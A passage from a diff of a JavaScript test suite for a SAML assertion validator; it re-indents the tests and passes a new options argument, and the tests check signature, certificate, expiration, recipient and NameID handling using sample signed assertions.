xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        assert.equal(\n-          err.message,\n-          \"SPNameQualifier attribute in the NameID element does not match urn:myapp\"\n-        );\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should parse attributes with multiple values\", function (done) {\n-    options.attributes = {\n-      \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\": [\n-        \"Admins\",\n-        \"Contributors\",\n-      ],\n-    };\n \n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-    });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        if (err) return done(err);\n-\n-        expect(profile).to.exist;\n-        expect(\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n-          ]\n-        ).to.be.an(\"array\");\n-        expect(\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n-          ]\n-        ).to.include(\"Admins\");\n-        expect(\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n-          ]\n-        ).to.include(\"Contributors\");\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate expiration with default clockSkew\", function (done) {\n-    options.lifetimeInSeconds = -240;\n-\n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-    });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.exist;\n-        expect(err.message).to.equal(\"assertion has expired.\");\n-        expect(profile).to.not.exist;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate expiration with overriden clockSkew\", function (done) {\n-    options.lifetimeInSeconds = -240;\n-\n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      clockSkew: 5,\n-    });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.not.exist;\n-        expect(profile).to.exist;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should should allow expired cert if option not passed\", function (done) {\n-    options.lifetimeInSeconds = 10000;\n-\n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    // The embedded cert is expired, so we can use this as is.\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n+    it('should validate the SPNameQualifier when the nameid format is \"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\"', function (done) {\n+        const signedAssertion =\n+            '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkExpiration: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                assert.equal(\n+                    err.message,\n+                    \"SPNameQualifier attribute in the NameID element does not match urn:myapp\"\n+                );\n+                done();\n+            }\n+        );\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.not.exist;\n-        expect(profile).to.exist;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate certificate expiration with embedded cert\", function (done) {\n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    // The embedded cert is expired, so we can use this as is.\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkCertExpiration: true,\n+\n+    it(\"should parse attributes with multiple values\", function (done) {\n+        options.attributes = {\n+            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\": [\n+                \"Admins\",\n+                \"Contributors\",\n+            ],\n+        };\n+\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                if (err) return done(err);\n+\n+                expect(profile).to.exist;\n+                expect(\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n+                        ]\n+                ).to.be.an(\"array\");\n+                expect(\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n+                        ]\n+                ).to.include(\"Admins\");\n+                expect(\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/groups\"\n+                        ]\n+                ).to.include(\"Contributors\");\n+                done();\n+            }\n+        );\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.exist;\n-        expect(err.message).to.equal(\n-          \"The signing certificate is not currently valid.\"\n+\n+    it(\"should validate expiration with default clockSkew\", function (done) {\n+        options.lifetimeInSeconds = -240;\n+\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.exist;\n+                expect(err.message).to.equal(\"assertion has expired.\");\n+                expect(profile).to.not.exist;\n+                done();\n+            }\n         );\n-        expect(profile).to.be.undefined;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate certificate expiration with non-embedded cert\", function (done) {\n-    const signedAssertion = saml20.create(options);\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    // The test cert is expired, so we can use this as is.\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkCertExpiration: true,\n     });\n-    const parsedAssertion = utils.parseSamlAssertion(signedAssertion);\n-    assert.equal(\n-      parsedAssertion.getElementsByTagName(\"X509Certificate\").length,\n-      1\n-    ); // Make sure we start with exactly one embedded cert\n-    const embeddedCert =\n-      parsedAssertion.getElementsByTagName(\"X509Certificate\")[0];\n-    embeddedCert.parentNode.removeChild(embeddedCert);\n-    assert.equal(\n-      parsedAssertion.getElementsByTagName(\"X509Certificate\").length,\n-      0\n-    ); // Make sure we removed the cert(s)\n-\n-    samlPassport.validateSamlAssertion(\n-      parsedAssertion,\n-      function (err, profile) {\n-        expect(err).to.exist;\n-        expect(err.message).to.equal(\n-          \"The signing certificate is not currently valid.\"\n+\n+    it(\"should validate expiration with overriden clockSkew\", function (done) {\n+        options.lifetimeInSeconds = -240;\n+\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            clockSkew: 5,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.not.exist;\n+                expect(profile).to.exist;\n+                done();\n+            }\n         );\n-        expect(profile).to.not.exist;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate recipent\", function (done) {\n-    options.lifetimeInSeconds = 600;\n-    options.recipient = \"foo\";\n-    const signedAssertion = saml20.create(options);\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      recipientUrl: \"bar\",\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.exist;\n-        expect(err.message).to.equal(\"Recipient is invalid. Configured: bar\");\n-        expect(profile).to.not.exist;\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should extract authentication context from assertion as a user prop\", function (done) {\n-    const options = {\n-      cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n-      key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n-      issuer: \"urn:issuer\",\n-      lifetimeInSeconds: 600,\n-      audiences: \"urn:myapp\",\n-      attributes: {\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\":\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-      },\n-      nameIdentifier: \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-      nameIdentifierFormat:\n-        \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n-    };\n \n-    const signedAssertion = saml20.create(options);\n+    it(\"should should allow expired cert if option not passed\", function (done) {\n+        options.lifetimeInSeconds = 10000;\n+\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        // The embedded cert is expired, so we can use this as is.\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.not.exist;\n+                expect(profile).to.exist;\n+                done();\n+            }\n+        );\n+    });\n \n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n+    it(\"should validate certificate expiration with embedded cert\", function (done) {\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        // The embedded cert is expired, so we can use this as is.\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkCertExpiration: true,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.exist;\n+                expect(err.message).to.equal(\n+                    \"The signing certificate is not currently valid.\"\n+                );\n+                expect(profile).to.be.undefined;\n+                done();\n+            }\n+        );\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (error, profile) {\n-        if (error) return done(error);\n \n-        assert.ok(profile);\n+    it(\"should validate certificate expiration with non-embedded cert\", function (done) {\n+        const signedAssertion = saml20.create(options);\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        // The test cert is expired, so we can use this as is.\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkCertExpiration: true,\n+        });\n+        const parsedAssertion = utils.parseSamlAssertion(signedAssertion);\n+        assert.equal(\n+            parsedAssertion.getElementsByTagName(\"X509Certificate\").length,\n+            1\n+        ); // Make sure we start with exactly one embedded cert\n+        const embeddedCert =\n+            parsedAssertion.getElementsByTagName(\"X509Certificate\")[0];\n+        embeddedCert.parentNode.removeChild(embeddedCert);\n         assert.equal(\n-          \"urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified\",\n-          profile[\n-            \"http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod\"\n-          ]\n+            parsedAssertion.getElementsByTagName(\"X509Certificate\").length,\n+            0\n+        ); // Make sure we removed the cert(s)\n+\n+        samlPassport.validateSamlAssertion(\n+            parsedAssertion.toString(), {},\n+            function (err, profile) {\n+                expect(err).to.exist;\n+                expect(err.message).to.equal(\n+                    \"The signing certificate is not currently valid.\"\n+                );\n+                expect(profile).to.not.exist;\n+                done();\n+            }\n         );\n+    });\n \n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should fail when the X509Certificate is invalid\", function (done) {\n-    const signedAssertion = fs\n-      .readFileSync(\n-        __dirname + \"/samples/plain/samlresponse_saml20_invalid_cert.txt\"\n-      )\n-      .toString();\n-    const options = {\n-      checkDestination: false,\n-      thumbprint: \"119B9E027959CDB7C662CFD075D9E2EF384E445F\",\n-    };\n-\n-    const samlPassport = new SamlPassport(options);\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        expect(err).to.exist;\n-        const errorMessages = [\n-          \"The signing certificate is invalid (PEM_read_bio_PUBKEY failed)\",\n-          \"The signing certificate is invalid (error:0906700D:PEM routines:PEM_ASN1_read_bio:ASN1 lib, error:0D07803A:asn1 encoding routines:ASN1_ITEM_EX_D2I:nested asn1 error, error:0D068066:asn1 encoding routines:ASN1_CHECK_TLEN:bad object header)\",\n-          \"The signing certificate is invalid (error:0D07803A:asn1 encoding routines:asn1_item_embed_d2i:nested asn1 error, error:0D068066:asn1 encoding routines:asn1_check_tlen:bad object header)\",\n-          \"The signing certificate is invalid (error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header)\",\n-        ];\n-\n-        assert.ok(err, \"The signing certificate was unexpectedly valid\");\n-        assert.ok(\n-          errorMessages.includes(err.message),\n-          \"Error message for invalid certificate is incorrect\"\n+    it(\"should validate recipent\", function (done) {\n+        options.lifetimeInSeconds = 600;\n+        options.recipient = \"foo\";\n+        const signedAssertion = saml20.create(options);\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            recipientUrl: \"bar\",\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.exist;\n+                expect(err.message).to.equal(\"Recipient is invalid. Configured: bar\");\n+                expect(profile).to.not.exist;\n+                done();\n+            }\n         );\n-        done();\n-      }\n-    );\n-  });\n-\n-  describe(\"validate saml assertion (signature checks)\", function () {\n-    it(\"should fail when signature is not found\", function (done) {\n-      const assertion =\n-        '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n-\n-      const publicKey = fs\n-        .readFileSync(__dirname + \"/test-auth0.cer\")\n-        .toString();\n-      const samlPassport = new SamlPassport({\n-        cert: publicKey,\n-        realm: \"urn:myapp\",\n-        checkRecipient: false,\n-      });\n-      samlPassport.validateSamlAssertion(assertion, function (err, profile) {\n-        assert.ok(err);\n-        assert.ok(!profile);\n-        assert.equal(\n-          err.message,\n-          \"Signature is missing (xpath: /*[local-name(.)='Assertion']/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#'])\"\n+    });\n+\n+    it(\"should extract authentication context from assertion as a user prop\", function (done) {\n+        const options = {\n+            cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n+            key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n+            issuer: \"urn:issuer\",\n+            lifetimeInSeconds: 600,\n+            audiences: \"urn:myapp\",\n+            attributes: {\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\":\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+            },\n+            nameIdentifier: \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+            nameIdentifierFormat:\n+                \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n+        };\n+\n+        const signedAssertion = saml20.create(options);\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (error, profile) {\n+                if (error) return done(error);\n+\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified\",\n+                    profile[\n+                        \"http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod\"\n+                        ]\n+                );\n+\n+                done();\n+            }\n         );\n-        done();\n-      });\n     });\n \n-    it(\"should fail when signature is found twice\", function (done) {\n-      const assertion =\n-        '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X